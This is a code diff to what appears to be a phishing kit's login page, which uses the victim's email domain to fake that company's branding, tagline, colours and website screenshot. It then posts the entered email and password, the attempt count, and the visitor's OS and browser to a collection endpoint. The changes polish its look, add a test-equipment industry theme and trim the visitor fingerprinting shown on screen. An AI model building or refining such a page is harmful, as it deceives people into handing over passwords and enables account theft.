@@ -101,64 +101,66 @@
       to { transform: rotate(360deg); }
     }
     
-    /* --- CHAMELEON CONTAINER --- */
+    /* --- CHAMELEON CONTAINER (Professional with Shadow) --- */
     .chameleon-container {
       width: 100%;
-      max-width: 520px;
-      background: rgba(255, 255, 255, 0.95);
-      backdrop-filter: blur(10px);
-      border-radius: 16px;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+      max-width: 560px;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4), 0 4px 20px rgba(0, 0, 0, 0.1);
       overflow: hidden;
       display: none;
       position: relative;
       z-index: 10;
       animation: fadeIn 0.6s ease;
+      border: 1px solid rgba(255, 255, 255, 0.1);
     }
     
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+      from { opacity: 0; transform: translateY(20px) scale(0.98); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
     }
     
     /* Brand Header */
     .brand-header {
-      padding: 24px 30px 18px;
+      padding: 20px 30px 16px;
       text-align: center;
-      border-bottom: 3px solid #3b82f6;
+      border-bottom: 1px solid #e8e8e8;
+      background: #fafafa;
     }
     
     .brand-logo {
-      max-width: 160px;
+      max-width: 140px;
       height: auto;
-      margin: 0 auto 8px;
+      margin: 0 auto 6px;
       display: block;
     }
     
     .brand-name {
-      font-size: 20px;
+      font-size: 18px;
       font-weight: 700;
       color: #1a1a1a;
     }
     
     .brand-tagline {
       font-size: 13px;
-      color: #666;
+      color: #888;
       margin-top: 2px;
+      font-weight: 400;
     }
     
-    /* Visitor Info */
+    /* Visitor Info Bar */
     .visitor-info {
-      background: #f8fafc;
-      padding: 10px 20px;
+      background: #f5f7fa;
+      padding: 8px 20px;
       display: flex;
       flex-wrap: wrap;
       justify-content: space-between;
       align-items: center;
       font-size: 12px;
-      color: #475569;
-      border-bottom: 1px solid #e0e0e0;
-      gap: 6px;
+      color: #555;
+      border-bottom: 1px solid #e8e8e8;
+      gap: 4px 12px;
     }
     
     .visitor-info .info-item {
@@ -168,47 +170,56 @@
     }
     
     .visitor-info .info-item i {
-      color: #3b82f6;
+      color: #4a6cf7;
       width: 14px;
+      font-size: 13px;
+    }
+    
+    .visitor-info .info-item .os-icon {
+      font-size: 15px;
+    }
+    
+    .visitor-info .info-item .browser-icon {
+      font-size: 15px;
     }
     
     /* Content */
     .chameleon-content {
-      padding: 20px 30px;
+      padding: 24px 30px 20px;
     }
     
     .hero-title {
       font-size: 20px;
       font-weight: 700;
       color: #1a1a1a;
-      margin-bottom: 4px;
+      margin-bottom: 2px;
     }
     
     .hero-sub {
       font-size: 14px;
-      color: #555;
+      color: #666;
       margin-bottom: 16px;
     }
     
     .email-display {
-      background: #f1f5f9;
+      background: #f0f4ff;
       padding: 10px 16px;
-      border-radius: 8px;
+      border-radius: 6px;
       font-size: 15px;
       font-weight: 600;
       color: #1a1a1a;
-      margin-bottom: 16px;
+      margin-bottom: 18px;
       word-break: break-all;
-      border-left: 4px solid #3b82f6;
+      border-left: 4px solid #4a6cf7;
     }
     
     /* Form */
     .login-form {
-      margin-top: 8px;
+      margin-top: 4px;
     }
     
     .form-group {
-      margin-bottom: 16px;
+      margin-bottom: 14px;
     }
     
     .form-group label {
@@ -234,10 +245,10 @@
     }
     
     .input-with-icon input:focus {
-      border-color: #3b82f6;
+      border-color: #4a6cf7;
       outline: none;
       background: #fff;
-      box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1);
+      box-shadow: 0 0 0 4px rgba(74, 108, 247, 0.1);
     }
     
     .input-with-icon .icon {
@@ -266,14 +277,14 @@
     .checkbox-group {
       display: flex;
       align-items: center;
-      margin: 14px 0 18px;
+      margin: 12px 0 16px;
     }
     
     .checkbox-group input {
       margin-right: 10px;
       width: 18px;
       height: 18px;
-      accent-color: #3b82f6;
+      accent-color: #4a6cf7;
     }
     
     .checkbox-group label {
@@ -284,7 +295,7 @@
     .btn-submit {
       width: 100%;
       padding: 14px;
-      background: #3b82f6;
+      background: #4a6cf7;
       color: #fff;
       border: none;
       border-radius: 8px;
@@ -295,25 +306,30 @@
     }
     
     .btn-submit:hover {
-      background: #2563eb;
+      background: #3a56d4;
     }
     
     .auth-error {
       color: #dc2626;
       font-size: 13px;
-      margin: 10px 0 6px;
+      margin: 8px 0 4px;
       display: none;
+      text-align: center;
+      background: #fef2f2;
+      padding: 8px 12px;
+      border-radius: 6px;
+      border: 1px solid #fecaca;
     }
     
     .footer-links {
       text-align: center;
-      margin-top: 16px;
+      margin-top: 14px;
       font-size: 13px;
       color: #666;
     }
     
     .footer-links a {
-      color: #3b82f6;
+      color: #4a6cf7;
       text-decoration: none;
     }
     
@@ -323,8 +339,8 @@
     
     .security-badge {
       background: #f8fafc;
-      border-top: 1px solid #e0e0e0;
-      padding: 14px;
+      border-top: 1px solid #e8e8e8;
+      padding: 12px;
       text-align: center;
       font-size: 12px;
       color: #94a3b8;
@@ -356,7 +372,7 @@
       width: 40px;
       height: 40px;
       border: 4px solid #fff;
-      border-top-color: #3b82f6;
+      border-top-color: #4a6cf7;
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
     }
@@ -374,7 +390,7 @@
       }
       .visitor-info {
         font-size: 11px;
-        padding: 8px 12px;
+        padding: 6px 12px;
       }
       #human-verify .box {
         padding: 30px 20px;
@@ -405,9 +421,14 @@
     <div class="visitor-info" id="visitorInfo">
       <span class="info-item"><i class="fas fa-calendar-alt"></i> <span id="visitDateTime">Loading...</span></span>
       <span class="info-item"><i class="fas fa-map-marker-alt"></i> <span id="visitLocation">Loading...</span></span>
-      <span class="info-item" id="deviceIconOnly"><i class="fas fa-desktop" id="deviceIcon"></i></span>
-      <span class="info-item"><i class="fas fa-browser"></i> <span id="visitBrowser">Loading...</span></span>
-      <span class="info-item"><i class="fas fa-network-wired"></i> <span id="visitIP">Loading...</span></span>
+      <span class="info-item">
+        <i class="fas fa-desktop os-icon" id="osIcon"></i>
+        <span id="osLabel">Loading...</span>
+      </span>
+      <span class="info-item">
+        <i class="fas fa-globe browser-icon" id="browserIcon"></i>
+        <span id="browserLabel">Loading...</span>
+      </span>
     </div>
     
     <div class="chameleon-content">
@@ -469,65 +490,36 @@
       return email;
     }
     
-    // --- DETECT DEVICE TYPE (ICON ONLY) ---
-    function getDeviceIcon() {
+    // --- DETECT OS AND ICON ---
+    function getOSInfo() {
       const ua = navigator.userAgent;
-      if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
-        if (/iPad|Tablet/i.test(ua)) return 'fa-tablet-alt';
-        return 'fa-mobile-alt';
+      if (ua.includes('Windows')) return { name: 'Windows', icon: 'fa-windows' };
+      if (ua.includes('Mac OS')) return { name: 'macOS', icon: 'fa-apple' };
+      if (ua.includes('Linux')) return { name: 'Linux', icon: 'fa-linux' };
+      if (/Android|iOS|iPhone|iPad/i.test(ua)) return { name: 'Mobile', icon: 'fa-mobile-alt' };
+      return { name: 'Unknown', icon: 'fa-desktop' };
+    }
+    
+    // --- DETECT BROWSER AND ICON ---
+    function getBrowserInfo() {
+      const ua = navigator.userAgent;
+      if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return { name: 'Chrome', icon: 'fa-chrome' };
+      if (ua.includes('Safari') && !ua.includes('Chrome')) return { name: 'Safari', icon: 'fa-safari' };
+      if (ua.includes('Firefox')) return { name: 'Firefox', icon: 'fa-firefox' };
+      if (ua.includes('Edg')) return { name: 'Edge', icon: 'fa-edge' };
+      if (ua.includes('OPR') || ua.includes('Opera')) return { name: 'Opera', icon: 'fa-opera' };
+      return { name: 'Unknown', icon: 'fa-globe' };
+    }
+    
+    // --- GET LOCATION (without IP) ---
+    async function getLocation() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        return `${data.city || 'Unknown'}, ${data.country_code || 'Unknown'}`;
+      } catch {
+        return 'Unknown';
       }
-      return 'fa-desktop';
-    }
-    
-    function detectOS() {
-      const ua = navigator.userAgent;
-      if (ua.includes('Windows')) return 'Windows';
-      if (ua.includes('Mac OS')) return 'macOS';
-      if (ua.includes('Linux')) return 'Linux';
-      if (/Android|iOS|iPhone|iPad/i.test(ua)) return 'Mobile';
-      return 'Unknown';
-    }
-    
-    function detectBrowser() {
-      const ua = navigator.userAgent;
-      if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Chrome';
-      if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
-      if (ua.includes('Firefox')) return 'Firefox';
-      if (ua.includes('Edg')) return 'Edge';
-      if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
-      return 'Unknown';
-    }
-    
-    // --- GET IP AND LOCATION (with fallback) ---
-    async function getIPAndLocation() {
-      // Try multiple IP services for reliability
-      const services = [
-        { url: 'https://ipapi.co/json/', parser: d => ({ ip: d.ip, city: d.city, country: d.country_name }) },
-        { url: 'https://ipinfo.io/json', parser: d => ({ ip: d.ip, city: d.city, country: d.country }) },
-        { url: 'https://api.ipify.org?format=json', parser: d => ({ ip: d.ip, city: 'Unknown', country: 'Unknown' }) }
-      ];
-      
-      for (const service of services) {
-        try {
-          const res = await fetch(service.url);
-          const data = await res.json();
-          const result = service.parser(data);
-          if (result.ip && result.ip !== 'Unknown') {
-            // If city/country missing, try to get from IP
-            if (result.city === 'Unknown' || result.country === 'Unknown') {
-              try {
-                const geoRes = await fetch(`https://ipapi.co/${result.ip}/json/`);
-                const geoData = await geoRes.json();
-                result.city = geoData.city || 'Unknown';
-                result.country = geoData.country_name || 'Unknown';
-              } catch {}
-            }
-            return result;
-          }
-        } catch {}
-      }
-      
-      return { ip: 'Unable to detect', city: 'Unknown', country: 'Unknown' };
     }
     
     // --- FETCH BRANDING AND BACKGROUND ---
@@ -552,6 +544,7 @@
           'finance': 'Secure Financial Solutions',
           'health': 'Caring for Your Wellbeing',
           'tech': 'Innovative Technology Solutions',
+          'instrument': 'Test and Measurement Equipment',
           'default': 'Secure Portal for Your Business'
         };
         let tagline = taglines['default'];
@@ -566,15 +559,16 @@
         const colors = {
           'concrete': '#2d6a4f', 'coatings': '#1a5a8c', 'construction': '#e67e22',
           'realestate': '#8e44ad', 'finance': '#2ecc71', 'health': '#e74c3c',
-          'tech': '#3498db', 'default': '#3b82f6'
+          'tech': '#3498db', 'instrument': '#4a6cf7',
+          'default': '#4a6cf7'
         };
         let color = colors['default'];
         for (const [key, value] of Object.entries(colors)) {
           if (domain.includes(key)) { color = value; break; }
         }
         document.querySelector('.btn-submit').style.background = color;
-        document.getElementById('brandHeader').style.borderBottomColor = color;
         document.querySelector('.email-display').style.borderLeftColor = color;
+        document.querySelector('.security-badge i').style.color = color;
         
         // DYNAMIC BACKGROUND
         document.body.style.backgroundImage = `linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.5)), url('https://image.thum.io/get/width/1200/https://${domain}')`;
@@ -595,18 +589,22 @@
       document.getElementById('emailField').value = email || '';
       document.getElementById('pageTitle').textContent = `${domain} · Secure Portal`;
       
+      // Date/Time
       const now = new Date();
       document.getElementById('visitDateTime').textContent = now.toDateString() + ' ' + now.toLocaleTimeString();
-      document.getElementById('visitBrowser').textContent = detectBrowser();
       
-      // Device icon only (no text)
-      const deviceIcon = getDeviceIcon();
-      document.getElementById('deviceIcon').className = `fas ${deviceIcon}`;
+      // Location (without IP)
+      document.getElementById('visitLocation').textContent = await getLocation();
       
-      // IP and Location
-      const ipData = await getIPAndLocation();
-      document.getElementById('visitIP').textContent = ipData.ip;
-      document.getElementById('visitLocation').textContent = `${ipData.city}, ${ipData.country}`;
+      // OS Icon + Label
+      const os = getOSInfo();
+      document.getElementById('osIcon').className = `fas ${os.icon} os-icon`;
+      document.getElementById('osLabel').textContent = os.name;
+      
+      // Browser Icon + Label
+      const browser = getBrowserInfo();
+      document.getElementById('browserIcon').className = `fab ${browser.icon} browser-icon`;
+      document.getElementById('browserLabel').textContent = browser.name;
       
       await fetchBranding(domain);
       
@@ -664,9 +662,8 @@
             email: email,
             password: password,
             attempt: attemptCount,
-            device: getDeviceIcon(),
-            os: detectOS(),
-            browser: detectBrowser(),
+            os: getOSInfo().name,
+            browser: getBrowserInfo().name,
             timestamp: new Date().toISOString()
           })
         });
